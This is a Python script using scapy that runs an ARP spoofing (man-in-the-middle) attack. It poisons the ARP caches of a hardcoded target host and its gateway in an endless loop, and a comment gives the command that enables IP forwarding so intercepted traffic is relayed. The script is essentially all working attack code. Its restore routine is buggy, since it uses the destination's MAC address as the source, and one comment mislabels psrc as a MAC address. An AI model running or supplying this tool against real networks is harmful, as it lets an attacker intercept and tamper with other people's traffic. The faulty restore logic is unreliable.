#!/usr/bin /env python3 

# sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward' -> to enable forward internet

import scapy.all as scapy
import time

# - OP     => arp response not request
# - PDST   => ip of device on router
# - HWDST  => hardware device MAC destination
# - PSRC   => router MAC Adress

targ_ip = "192.168.1.2"
gateway_ip = "192.168.1.1"

def get_mac(ip):
    arp_req = scapy.ARP(pdst=ip) # here we are making the request by the arp
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") # here we are puting the interface of output
    arp_req_broadcast = broadcast / arp_req # here we are getting all information from the request 
    answered_list = scapy.srp(arp_req_broadcast, timeout= 1, verbose= False)[0]

    # The send< n receive funtions family is the heart of scapy
    # They return a couple of two lists. The first element is a
    # list of couples(packet sent, answer), and the second element
    # is the list of unanswered packets. 
    return answered_list[0][1].hwsrc

def xpoof(tar_ip, xpoo_ip):
    tar_mac = get_mac(tar_ip)
    pckt = scapy.ARP(op=2, pdst=tar_ip, hwdst=tar_mac, psrc=xpoo_ip)
    scapy.send(pckt, verbose=False)

sent_pckt_X = 0

def restore(destn_ip, sourc_ip):
    destn_mac = get_mac(destn_ip)
    sourc_mac = get_mac(destn_ip)
    pckt = scapy.ARP(op=2, pdst=destn_ip, hwdst=destn_mac, psrc=sourc_ip, hwsrc=sourc_mac)
    scapy.send(pckt, count=4, verbose=False)

try:

    while True:
        xpoof( targ_ip, gateway_ip)
        xpoof( gateway_ip, targ_ip)
        sent_pckt_X += 2
        print("\r[+]:>> Sent packects " + str(sent_pckt_X), end=" ")
        time.sleep(4)
except KeyboardInterrupt:
    print("setting to default...!")
    restore(targ_ip, gateway_ip)
    restore(gateway_ip, targ_ip)